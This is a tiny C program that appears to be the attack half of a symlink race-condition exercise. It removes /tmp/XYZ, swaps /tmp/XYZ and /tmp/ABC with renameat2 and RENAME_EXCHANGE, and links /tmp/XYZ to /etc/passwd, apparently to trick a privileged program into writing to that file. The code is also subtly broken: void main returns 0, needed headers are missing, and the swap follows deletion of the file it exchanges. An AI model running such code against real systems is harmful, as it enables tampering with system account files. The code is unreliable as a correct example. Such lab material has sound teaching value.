#include<stdio.h>
void main(){
unlink("/tmp/XYZ"); 
syscall(SYS_renameat2,0,"/tmp/XYZ",0,"/tmp/ABC",RENAME_EXCHANGE);
symlink("/etc/passwd","/tmp/XYZ");
return 0;
}
